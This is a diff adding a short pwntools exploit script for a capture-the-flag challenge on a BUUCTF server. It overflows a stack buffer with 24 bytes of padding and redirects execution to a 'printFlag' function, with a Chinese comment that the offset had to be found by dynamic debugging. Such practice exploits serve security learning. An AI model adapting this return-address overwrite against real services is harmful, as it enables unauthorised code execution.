@@ -1,0 +1,10 @@
+from pwn import*
+context(arch='i386',os='linux',log_level='debug')
+elf=ELF('./1')
+io=remote('node5.buuoj.cn',25073)
+flag_addr=elf.sym['printFlag']
+payload=b'a'*24+p32(flag_addr)
+io.sendline(payload)
+io.interactive()
+
+这道题ida的偏移量不对需要动态调试
